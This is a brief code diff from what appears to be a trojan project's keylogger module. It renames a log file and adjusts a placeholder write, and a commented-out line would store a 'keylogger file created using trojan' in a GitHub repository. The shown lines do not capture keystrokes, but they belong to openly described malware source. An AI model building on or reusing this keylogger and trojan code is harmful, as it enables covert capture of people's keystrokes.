@@ -10,8 +10,8 @@ target_port = 9999
 
 # this function logs keyboard input parsing to English Us keyboard format 
 def run(**args):
-	log = open("data/abc/keylog.data", "a")
-	log.write("trying to Write something in Github directory ")
+	log = open("data/abc/keylogger.data", "a")
+	log.write("trying to Write something in Github directory \n")
 	log.close()
 	 #repo.create_file("data/abc/keylogger.data","keylogger file is created using trojan",base64.b64encode(data))
 	# try to guess which event file to use
